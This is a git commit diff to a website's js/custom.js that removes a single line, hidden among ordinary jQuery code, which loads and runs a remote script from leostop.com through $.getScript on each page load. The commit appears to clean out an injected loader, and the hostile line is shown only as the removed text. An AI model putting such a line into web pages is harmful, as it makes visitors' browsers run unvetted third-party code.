329d636bddaece83304e7bdae046a85cb29b381b
StudentLeaders <96332078+StudentLeaders@users.noreply.github.com>
2022-05-12 17:04:45 -0500

    Update custom.js

--- js/custom.js
+++ js/custom.js
@@ -64,7 +64,7 @@
     });
 
 
-    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) {  } });
 
     /* ==============================================
 		Scroll to top  
